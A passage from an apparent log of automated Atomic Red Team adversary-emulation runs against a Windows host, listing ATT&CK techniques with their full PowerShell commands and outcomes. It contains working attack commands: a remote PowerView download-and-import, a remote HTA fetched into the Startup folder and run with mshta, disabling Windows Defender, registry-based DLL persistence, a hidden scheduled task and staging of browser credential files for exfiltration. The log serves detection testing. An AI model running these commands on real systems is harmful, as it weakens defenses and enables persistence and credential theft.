            '"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1" '
            '-OutFile '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1"};  ;  '
            'Import-Module '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1"; '
            'Invoke-ShareFinder -CheckShareAccess',
 'delegated': '2023-11-30T10:09:55Z',
 'description': 'PowerView is a PowerShell tool to gain network situational '
                'awareness on Windows domains. ShareFinder finds '
                '(non-standard) shares on machines in the domain.',
 'executor': 'psh',
 'link_id': 'f24f959c-36f9-43c2-8c6a-f3d8286bd53d',
 'name': 'PowerView ShareFinder',
 'pid': 10924,
 'plaintext_command': 'if (Test-Path '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1") '
                      '{ ; } else {New-Item -Type Directory '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\" '
                      '-ErrorAction Ignore -Force | Out-Null; '
                      'Invoke-WebRequest '
                      '"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1" '
                      '-OutFile '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1"};  '
                      ';  Import-Module '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1"; '
                      'Invoke-ShareFinder -CheckShareAccess',
 'platform': 'windows',
 'run': '2023-11-30T10:10:19Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__cbf44e79b4bef7b2e997508f759beee3__trial_1

atomic_ordering: ['cbf44e79b4bef7b2e997508f759beee3']
==============================
==============================
adversary_id: atomic__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__4e80b3c50bd1fff09f4cfd628f031149__trial_1

atomic_ordering: ['4e80b3c50bd1fff09f4cfd628f031149']
==============================
==============================
adversary_id: atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__337c07ce279b747827679ffb226e5d9c__trial_1

atomic_ordering: ['337c07ce279b747827679ffb226e5d9c']
------------------------------
{'ability_id': '337c07ce279b747827679ffb226e5d9c',
 'agent_reported_time': '2023-11-11T13:10:47Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.005',
            'technique_name': 'Signed Binary Proxy Execution: Mshta'},
 'command': '$var =Invoke-WebRequest '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"; '
            '$var.content|out-file "$env:appdata\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\Startup\\T1218.005.hta"; mshta '
            '"$env:appdata\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\Startup\\T1218.005.hta"; start-sleep -s 15; '
            'stop-process -name "calculator" -Force',
 'delegated': '2023-11-30T22:46:49Z',
 'description': 'Execute an arbitrary remote HTA. Upon execution calc.exe will '
                'be launched.\n',
 'executor': 'psh',
 'link_id': '4d3b5794-c99c-4a84-98e8-62b4e11f6056',
 'name': 'Mshta Executes Remote HTML Application (HTA)',
 'pid': 8080,
 'plaintext_command': '$var =Invoke-WebRequest '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"; '
                      '$var.content|out-file '
                      '"$env:appdata\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\Startup\\T1218.005.hta"; mshta '
                      '"$env:appdata\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\Startup\\T1218.005.hta"; start-sleep -s '
                      '15; stop-process -name "calculator" -Force',
 'platform': 'windows',
 'run': '2023-11-30T22:48:36Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1574_012__multiple__hijack_execution_flow-_cor_profiler__44c554d9bf01759c8a35c8ec8eb8510d__trial_1

atomic_ordering: ['44c554d9bf01759c8a35c8ec8eb8510d']
------------------------------
{'ability_id': '44c554d9bf01759c8a35c8ec8eb8510d',
 'agent_reported_time': '2023-11-11T13:10:10Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1574.012',
            'technique_name': 'Hijack Execution Flow: COR_PROFILER'},
 'command': 'Write-Host "Creating system environment variables" '
            '-ForegroundColor Cyan; New-ItemProperty -Path '
            "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
            'Manager\\Environment\' -Name "COR_ENABLE_PROFILING" -PropertyType '
            'String -Value "1" -Force | Out-Null; New-ItemProperty -Path '
            "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
            'Manager\\Environment\' -Name "COR_PROFILER" -PropertyType String '
            '-Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | '
            'Out-Null; New-ItemProperty -Path '
            "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
            'Manager\\Environment\' -Name "COR_PROFILER_PATH" -PropertyType '
            'String -Value "83f016_T1574.012x64.dll" -Force | Out-Null',
 'delegated': '2023-12-04T02:21:09Z',
 'description': 'Creates system scope environment variables to enable a .NET '
                'profiler (COR_PROFILER). System scope environment variables '
                'require a restart to take effect.\n'
                'The unmanaged profiler DLL (T1574.012x64.dll`) executes when '
                'the CLR is loaded by any process. Additionally, the profiling '
                'DLL will inherit the integrity\n'
                'level of Event Viewer bypassing UAC and executing '
                '`notepad.exe` with high integrity. If the account used is not '
                'a local administrator the profiler DLL will\n'
                'still execute each time the CLR is loaded by a process, '
                'however, the notepad process will not execute with high '
                'integrity.\n'
                '\n'
                'Reference: '
                'https://redcanary.com/blog/cor_profiler-for-persistence/\n',
 'executor': 'psh',
 'link_id': '01bbad9b-a953-4a7d-bc89-54223215092d',
 'name': 'System Scope COR_PROFILER',
 'pid': 9520,
 'plaintext_command': 'Write-Host "Creating system environment variables" '
                      '-ForegroundColor Cyan; New-ItemProperty -Path '
                      "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                      'Manager\\Environment\' -Name "COR_ENABLE_PROFILING" '
                      '-PropertyType String -Value "1" -Force | Out-Null; '
                      'New-ItemProperty -Path '
                      "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                      'Manager\\Environment\' -Name "COR_PROFILER" '
                      '-PropertyType String -Value '
                      '"{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | '
                      'Out-Null; New-ItemProperty -Path '
                      "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                      'Manager\\Environment\' -Name "COR_PROFILER_PATH" '
                      '-PropertyType String -Value "83f016_T1574.012x64.dll" '
                      '-Force | Out-Null',
 'platform': 'windows',
 'run': '2023-12-04T02:21:15Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__36aa805044ab4f4d7f6f372a46c8bab2__trial_1

atomic_ordering: ['36aa805044ab4f4d7f6f372a46c8bab2']
------------------------------
{'ability_id': '36aa805044ab4f4d7f6f372a46c8bab2',
 'agent_reported_time': '2023-11-11T13:10:00Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.004',
            'technique_name': 'Indicator Removal on Host: File Deletion'},
 'command': 'Remove-Item -Path $env:TEMP\\deleteme_folder_T1551.004 -Recurse',
 'delegated': '2023-11-28T17:56:42Z',
 'description': 'Recursively delete a folder in the temporary directory using '
                'Powershell. Upon execution, no output will be displayed. Use '
                'File Explorer to verify the folder was deleted.\n',
 'executor': 'psh',
 'link_id': '5c356b03-3314-4743-bfae-4420c0bf8b7b',
 'name': 'Delete an entire folder - Windows PowerShell',
 'pid': 1540,
 'plaintext_command': 'Remove-Item -Path $env:TEMP\\deleteme_folder_T1551.004 '
                      '-Recurse',
 'platform': 'windows',
 'run': '2023-11-28T17:56:56Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__f0fde90a3d59061b226197974e7dcbaa__trial_1

atomic_ordering: ['f0fde90a3d59061b226197974e7dcbaa']
------------------------------
{'ability_id': 'f0fde90a3d59061b226197974e7dcbaa',
 'agent_reported_time': '2023-11-11T13:10:31Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': 'Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference '
            '-DisableBehaviorMonitoring 1; Set-MpPreference '
            '-DisableScriptScanning 1; Set-MpPreference '
            '-DisableBlockAtFirstSeen 1',
 'delegated': '2023-12-03T14:25:05Z',
 'description': 'Attempting to disable scheduled scanning and other parts of '
                'windows defender atp. Upon execution Virus and Threat '
                'Protection will show as disabled\n'
                'in Windows settings.\n',
 'executor': 'psh',
 'link_id': 'b35d17a4-5fcd-48c6-a375-b817d95b643b',
 'name': 'Tamper with Windows Defender ATP PowerShell',
 'pid': 5416,
 'plaintext_command': 'Set-MpPreference -DisableRealtimeMonitoring 1; '
                      'Set-MpPreference -DisableBehaviorMonitoring 1; '
                      'Set-MpPreference -DisableScriptScanning 1; '
                      'Set-MpPreference -DisableBlockAtFirstSeen 1',
 'platform': 'windows',
 'run': '2023-12-03T14:25:51Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__2d2b2b31b70f1beef285b942c580f4c3__trial_1

atomic_ordering: ['2d2b2b31b70f1beef285b942c580f4c3']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1049__discovery__system_network_connections_discovery__6e3d4c708ab0ff571eb05691cc8bcdda__trial_1

atomic_ordering: ['6e3d4c708ab0ff571eb05691cc8bcdda']
------------------------------
{'ability_id': '6e3d4c708ab0ff571eb05691cc8bcdda',
 'agent_reported_time': '2023-11-11T13:09:52Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1049',
            'technique_name': 'System Network Connections Discovery'},
 'command': '$syntaxList = "Invoke-ACLScanner", "Invoke-Kerberoast", '
            '"Find-DomainShare" ; foreach ($syntax in $syntaxList) {; '
            'PathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe $syntax '
            '-}',
 'delegated': '2023-11-27T21:57:23Z',
 'description': 'Get a listing of network connections, domains, domain users, '
                'and etc.  \n'
                'sharpview.exe located in the bin folder, an opensource '
                'red-team tool.\n'
                'Upon successful execution, cmd.exe will execute sharpview.exe '
                '<method>. Results will output via stdout.\n',
 'executor': 'psh',
 'link_id': '809120c5-712e-42d7-98d4-266dead8401f',
 'name': 'System Discovery using SharpView',
 'pid': 10224,
 'plaintext_command': '$syntaxList = "Invoke-ACLScanner", "Invoke-Kerberoast", '
                      '"Find-DomainShare" ; foreach ($syntax in $syntaxList) '
                      '{; '
                      'PathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe '
                      '$syntax -}',
 'platform': 'windows',
 'run': '2023-11-27T21:57:27Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1055_001__multiple__process_injection-_dynamic-link_library_injection__3b22226d4454aff3f0ea046bbe637e77__trial_1

atomic_ordering: ['3b22226d4454aff3f0ea046bbe637e77']
==============================
==============================
adversary_id: atomic__t1555__credential-access__credentials_from_password_stores__2c6e39a39ebf794d74417a7b1291463b__trial_1

atomic_ordering: ['2c6e39a39ebf794d74417a7b1291463b']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1071_001__command-and-control__application_layer_protocol-_web_protocols__ef2c951840423ba90c208867dcf89c87__trial_1

atomic_ordering: ['ef2c951840423ba90c208867dcf89c87']
------------------------------
{'ability_id': 'ef2c951840423ba90c208867dcf89c87',
 'agent_reported_time': '2023-11-11T13:09:56Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1071.001',
            'technique_name': 'Application Layer Protocol: Web Protocols'},
 'command': 'Invoke-WebRequest www.google.com -UserAgent "HttpBrowser/1.0" | '
            'out-null; Invoke-WebRequest www.google.com -UserAgent '
            '"Wget/1.9+cvs-stable (Red Hat modified)" | out-null; '
            'Invoke-WebRequest www.google.com -UserAgent "Opera/8.81 (Windows '
            'NT 6.0; U; en)" | out-null; Invoke-WebRequest www.google.com '
            '-UserAgent "*<|>*" | out-null',
 'delegated': '2023-11-28T21:11:08Z',
 'description': 'This test simulates an infected host beaconing to command and '
                'control. Upon execution, no output will be displayed. \n'
                'Use an application such as Wireshark to record the session '
                'and observe user agent strings and responses.\n'
                '\n'
                'Inspired by APTSimulator - '
                'https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n',
 'executor': 'psh',
 'link_id': '6d748753-3b77-462f-a161-e976033bd4ff',
 'name': 'Malicious User Agents - Powershell',
 'pid': 11116,
 'plaintext_command': 'Invoke-WebRequest www.google.com -UserAgent '
                      '"HttpBrowser/1.0" | out-null; Invoke-WebRequest '
                      'www.google.com -UserAgent "Wget/1.9+cvs-stable (Red Hat '
                      'modified)" | out-null; Invoke-WebRequest www.google.com '
                      '-UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | '
                      'out-null; Invoke-WebRequest www.google.com -UserAgent '
                      '"*<|>*" | out-null',
 'platform': 'windows',
 'run': '2023-11-28T21:11:27Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_003__multiple__time_providers__23daed0787180c7f2ffbc20528570749__trial_1

atomic_ordering: ['23daed0787180c7f2ffbc20528570749']
------------------------------
{'ability_id': '23daed0787180c7f2ffbc20528570749',
 'agent_reported_time': '2023-11-11T13:10:40Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.003',
            'technique_name': 'Time Providers'},
 'command': 'net stop w32time; Copy-Item '
            '"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll" '
            'C:\\Users\\Public\\AtomicTest.dll; reg add '
            '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest" '
            '/t REG_SZ /v "DllName" /d "C:\\Users\\Public\\AtomicTest.dll" /f; '
            'reg add '
            '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest" '
            '/t REG_DWORD /v "Enabled" /d "1" /f; reg add '
            '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest" '
            '/t REG_DWORD /v "InputProvider" /d "1" /f; net start w32time',
 'delegated': '2023-12-02T04:23:52Z',
 'description': 'Establishes persistence by creating a new time provider '
                'registry key under '
                'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\n'
                'The new time provider will point to a DLL which will be '
                'loaded after the w32time service is started. The DLL will '
                'then create the file AtomicTest.txt\n'
                'in C:\\Users\\Public\\ as validation that the test is '
                'successful.\n'
                '\n'
                'Payload source code: '
                'https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n',
 'executor': 'psh',
 'link_id': '05ed0b53-0ac8-4c53-9b8c-991010d1036e',
 'name': 'Create a new time provider',
 'pid': 2624,
 'plaintext_command': 'net stop w32time; Copy-Item '
                      '"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll" '
                      'C:\\Users\\Public\\AtomicTest.dll; reg add '
                      '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest" '
                      '/t REG_SZ /v "DllName" /d '
                      '"C:\\Users\\Public\\AtomicTest.dll" /f; reg add '
                      '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest" '
                      '/t REG_DWORD /v "Enabled" /d "1" /f; reg add '
                      '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest" '
                      '/t REG_DWORD /v "InputProvider" /d "1" /f; net start '
                      'w32time',
 'platform': 'windows',
 'run': '2023-12-02T04:24:43Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1564_006__defense-evasion__run_virtual_instance__5b0527d3382ac91860501cccc9595348__trial_1

atomic_ordering: ['5b0527d3382ac91860501cccc9595348']
------------------------------
{'ability_id': '5b0527d3382ac91860501cccc9595348',
 'agent_reported_time': '2023-11-11T13:09:58Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1564.006',
            'technique_name': 'Run Virtual Instance'},
 'command': 'if ((Get-WindowsOptionalFeature -Online -FeatureName '
            'Microsoft-Hyper-V) { ; } else {Enable-WindowsOptionalFeature '
            '-Online -FeatureName Microsoft-Hyper-V -All -Force};  ;  $VM = '
            '"Atomic VM"; New-VM -Name $VM -Generation 2; Set-VMFirmware $VM '
            '-EnableSecureBoot Off; Start-VM $VM',
 'delegated': '2023-12-03T19:53:18Z',
 'description': 'Create a simple Hyper-V VM (Windows native hypervisor) and '
                'start up the machine\n'
                'Cleanup command stops and deletes the newly created VM\n'
                'https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v\n'
                'https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\n'
                'https://attack.mitre.org/techniques/T1564/006/\n',
 'executor': 'psh',
 'link_id': '60072c20-9fed-4a81-bde4-cccc6ec70d21',
 'name': 'Create and start Hyper-V virtual machine',
 'pid': 9520,
 'plaintext_command': 'if ((Get-WindowsOptionalFeature -Online -FeatureName '
                      'Microsoft-Hyper-V) { ; } else '
                      '{Enable-WindowsOptionalFeature -Online -FeatureName '
                      'Microsoft-Hyper-V -All -Force};  ;  $VM = "Atomic VM"; '
                      'New-VM -Name $VM -Generation 2; Set-VMFirmware $VM '
                      '-EnableSecureBoot Off; Start-VM $VM',
 'platform': 'windows',
 'run': '2023-12-03T19:53:24Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1204_002__execution__user_execution-_malicious_file__a45769d74eb1c75ff916b121023bde31__trial_1

atomic_ordering: ['a45769d74eb1c75ff916b121023bde31']
------------------------------
{'ability_id': 'a45769d74eb1c75ff916b121023bde31',
 'agent_reported_time': '2023-11-11T13:09:51Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1204.002',
            'technique_name': 'User Execution: Malicious File'},
 'command': 'Cd "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs"; '
            'New-ItemProperty -Path '
            'Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security '
            '-Name "VBAWarnings" -Value "1" -PropertyType DWORD -Force | '
            "Out-Null; & '.\\Excel 2016.lnk' "
            '"PathToAtomicsFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm"',
 'delegated': '2023-11-30T15:38:32Z',
 'description': 'Emulates the JS -> MSI chain of the MirrorBlast T505 campaign '
                'by executing an xlsm file designed. \n'
                'Requires the 32 bit version of Office to run. [MirrorBlast '
                'Campaign '
                'Analysis](https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies)\n',
 'executor': 'psh',
 'link_id': '21245f83-cf17-4941-8ef4-973a04b2f3f3',
 'name': 'Mirror Blast Emulation',
 'pid': 9520,
 'plaintext_command': 'Cd "C:\\ProgramData\\Microsoft\\Windows\\Start '
                      'Menu\\Programs"; New-ItemProperty -Path '
                      'Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security '
                      '-Name "VBAWarnings" -Value "1" -PropertyType DWORD '
                      "-Force | Out-Null; & '.\\Excel 2016.lnk' "
                      '"PathToAtomicsFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm"',
 'platform': 'windows',
 'run': '2023-11-30T15:38:37Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1095__command-and-control__non-application_layer_protocol__4640e7df3aa2f0bc88f4c0ad5a215c83__trial_1

atomic_ordering: ['4640e7df3aa2f0bc88f4c0ad5a215c83']
==============================
==============================
adversary_id: atomic__t1053_005__multiple__scheduled_task,job-_scheduled_task__5e744dc6fc70da028ccd50f7e73ee0be__trial_1

atomic_ordering: ['5e744dc6fc70da028ccd50f7e73ee0be']
------------------------------
{'ability_id': '5e744dc6fc70da028ccd50f7e73ee0be',
 'agent_reported_time': '2023-11-11T13:09:48Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1053.005',
            'technique_name': 'Scheduled Task/Job: Scheduled Task'},
 'command': '$xml = '
            '[System.IO.File]::ReadAllText("54d4ab_T1053_05_SCTASK_HIDDEN_ATTRIB.xml"); '
            'Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace '
            '"Root\\Microsoft\\Windows\\TaskScheduler" -MethodName '
            '"RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }',
 'delegated': '2023-11-27T23:13:27Z',
 'description': 'Create an scheduled task that executes calc.exe after user '
                'login from XML that contains hidden setting attribute. \n'
                'This technique was seen several times in tricbot malware and '
                'also with the targetted attack campaigne the industroyer2.\n',
 'executor': 'psh',
 'link_id': 'a5ecf818-ad68-4d59-b48a-d17acec510f9',
 'name': 'Import XML Schedule Task with Hidden Attribute',
 'pid': 7192,
 'plaintext_command': '$xml = '
                      '[System.IO.File]::ReadAllText("54d4ab_T1053_05_SCTASK_HIDDEN_ATTRIB.xml"); '
                      'Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace '
                      '"Root\\Microsoft\\Windows\\TaskScheduler" -MethodName '
                      '"RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; '
                      '}',
 'platform': 'windows',
 'run': '2023-11-27T23:14:15Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__56c2f2d8b48bcb1c999d4e8929bd8d9b__trial_1

atomic_ordering: ['56c2f2d8b48bcb1c999d4e8929bd8d9b']
------------------------------
{'ability_id': '56c2f2d8b48bcb1c999d4e8929bd8d9b',
 'agent_reported_time': '2023-11-11T13:09:56Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555.003',
            'technique_name': 'Credentials from Password Stores: Credentials '
                              'from Web Browsers'},
 'command': '$exfil_folder = "$env:temp\\T1555.003"; if (test-path '
            '"$exfil_folder") {} else {new-item -path "$env:temp" -Name '
            '"T1555.003" -ItemType "directory" -force}; $FirefoxCredsLocation '
            '= get-childitem -path '
            '"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\"; '
            'if (test-path "$FirefoxCredsLocation\\key4.db") {copy-item '
            '"$FirefoxCredsLocation\\key4.db" -destination '
            '"$exfil_folder\\T1555.003Firefox_key4.db"} else {}; if (test-path '
            '"$FirefoxCredsLocation\\logins.json") {copy-item '
            '"$FirefoxCredsLocation\\logins.json" -destination '
            '"$exfil_folder\\T1555.003Firefox_logins.json"} else {}; if '
            '(test-path "$env:localappdata\\Google\\Chrome\\User '
            'Data\\Default\\Login Data") {copy-item '
            '"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login '
            'Data" -destination "$exfil_folder\\T1555.003Chrome_Login Data"} '
            'else {}; if (test-path "$env:localappdata\\Google\\Chrome\\User '
            'Data\\Default\\Login Data For Account") {copy-item '
            '"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login '
            'Data For Account" -destination '
            '"$exfil_folder\\T1555.003Chrome_Login Data For Account"} else {}; '
            'if (test-path "$env:appdata\\Opera Software\\Opera Stable\\Login '
            'Data") {copy-item "$env:appdata\\Opera Software\\Opera '
            'Stable\\Login Data" -destination '
            '"$exfil_folder\\T1555.003Opera_Login Data"} else {}; if '
            '(test-path "$env:localappdata/Microsoft/Edge/User '
            'Data/Default/Login Data") {copy-item '
            '"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" '
            '-destination "$exfil_folder\\T1555.003Edge_Login Data"} else {} ; '
            'compress-archive -path "$exfil_folder" -destinationpath '
            '"$exfil_folder.zip" -force',
 'delegated': '2023-12-02T22:33:20Z',
 'description': 'This test is designed to search a drive for credential files '
                'used by the most common web browsers on Windows (Firefox, '
                'Chrome, Opera, and Edge), export the found files to a folder, '
                'and zip it,\n'
                'simulating how an adversary might stage sensitive credential '
                'files for exfiltration in order to conduct offline password '
                'extraction with tools like '
                '[firepwd.py](https://github.com/lclevy/firepwd) or '
                '[HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n',
 'executor': 'psh',
 'link_id': '80c507f8-37e6-4469-83e0-0fb174eb169f',
 'name': 'Stage Popular Credential Files for Exfiltration',
 'pid': 7444,
 'plaintext_command': '$exfil_folder = "$env:temp\\T1555.003"; if (test-path '
                      '"$exfil_folder") {} else {new-item -path "$env:temp" '
                      '-Name "T1555.003" -ItemType "directory" -force}; '
                      '$FirefoxCredsLocation = get-childitem -path '
                      '"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\"; '
                      'if (test-path "$FirefoxCredsLocation\\key4.db") '
                      '{copy-item "$FirefoxCredsLocation\\key4.db" '
                      '-destination "$exfil_folder\\T1555.003Firefox_key4.db"} '
                      'else {}; if (test-path '
                      '"$FirefoxCredsLocation\\logins.json") {copy-item '
                      '"$FirefoxCredsLocation\\logins.json" -destination '
                      '"$exfil_folder\\T1555.003Firefox_logins.json"} else {}; '
                      'if (test-path "$env:localappdata\\Google\\Chrome\\User '
                      'Data\\Default\\Login Data") {copy-item '
                      '"$env:localappdata\\Google\\Chrome\\User '
                      'Data\\Default\\Login Data" -destination '
                      '"$exfil_folder\\T1555.003Chrome_Login Data"} else {}; '
                      'if (test-path "$env:localappdata\\Google\\Chrome\\User '
                      'Data\\Default\\Login Data For Account") {copy-item '
                      '"$env:localappdata\\Google\\Chrome\\User '
                      'Data\\Default\\Login Data For Account" -destination '
                      '"$exfil_folder\\T1555.003Chrome_Login Data For '
                      'Account"} else {}; if (test-path "$env:appdata\\Opera '
                      'Software\\Opera Stable\\Login Data") {copy-item '
                      '"$env:appdata\\Opera Software\\Opera Stable\\Login '
                      'Data" -destination "$exfil_folder\\T1555.003Opera_Login '
                      'Data"} else {}; if (test-path '
                      '"$env:localappdata/Microsoft/Edge/User '
                      'Data/Default/Login Data") {copy-item '
                      '"$env:localappdata/Microsoft/Edge/User '
                      'Data/Default/Login Data" -destination '
                      '"$exfil_folder\\T1555.003Edge_Login Data"} else {} ; '
                      'compress-archive -path "$exfil_folder" -destinationpath '
                      '"$exfil_folder.zip" -force',
 'platform': 'windows',
 'run': '2023-12-02T22:33:43Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1087_001__discovery__account_discovery-_local_account__e528524d6a3cddaaddc89fcc719e2a3f__trial_1

atomic_ordering: ['e528524d6a3cddaaddc89fcc719e2a3f']
------------------------------
{'ability_id': 'e528524d6a3cddaaddc89fcc719e2a3f',
 'agent_reported_time': '2023-11-11T13:10:33Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1087.001',
            'technique_name': 'Account Discovery: Local Account'},
 'command': 'net user; get-localuser; get-localgroupmember -group Users; '
            'cmdkey.exe /list; ls C:/Users; get-childitem C:\\Users\\; dir '
            'C:\\Users\\; get-localgroup; net localgroup',
 'delegated': '2023-11-29T05:14:30Z',
 'description': 'Enumerate all accounts via PowerShell. Upon execution, lots '
                'of user account and group information will be displayed.\n',
 'executor': 'psh',
 'link_id': '47b949ba-03e3-4980-940a-deaa54e33762',
 'name': 'Enumerate all accounts via PowerShell (Local)',
 'pid': 5520,
 'plaintext_command': 'net user; get-localuser; get-localgroupmember -group '
                      'Users; cmdkey.exe /list; ls C:/Users; get-childitem '
                      'C:\\Users\\; dir C:\\Users\\; get-localgroup; net '
                      'localgroup',
 'platform': 'windows',
 'run': '2023-11-29T05:15:31Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1057__discovery__process_discovery__1d48fc4147a7bcd47bdf60db7dde9640__trial_1

atomic_ordering: ['1d48fc4147a7bcd47bdf60db7dde9640']
------------------------------
{'ability_id': '1d48fc4147a7bcd47bdf60db7dde9640',
 'agent_reported_time': '2023-11-11T13:09:53Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1057',
            'technique_name': 'Process Discovery'},
 'command': 'Get-Process',
 'delegated': '2023-11-28T04:24:20Z',
 'description': 'Utilize Get-Process PowerShell cmdlet to identify processes.\n'
                '\n'
                'Upon successful execution, powershell.exe will execute '
                'Get-Process to list processes. Output will be via stdout. \n',
 'executor': 'psh',
 'link_id': '2486747c-bb10-4e3c-b87c-b9eff07e2893',
 'name': 'Process Discovery - Get-Process',
 'pid': 7752,
 'plaintext_command': 'Get-Process',
 'platform': 'windows',
 'run': '2023-11-28T04:24:33Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1505_004__persistence__iis_components__e8c24e75714483eb3b526fc589a88f9a__trial_1

atomic_ordering: ['e8c24e75714483eb3b526fc589a88f9a']
------------------------------
{'ability_id': 'e8c24e75714483eb3b526fc589a88f9a',
 'agent_reported_time': '2023-11-11T13:09:55Z',
 'attack': {'tactic': 'persistence',
            'technique_id': 'T1505.004',
            'technique_name': 'IIS Components'},
 'command': 'New-WebGlobalModule -Name DefaultDocumentModule_Atomic -Image '
            '%windir%\\system32\\inetsrv\\defdoc.dll',
 'delegated': '2023-12-01T12:20:13Z',
 'description': 'The following Atomic will utilize PowerShell Cmdlet '
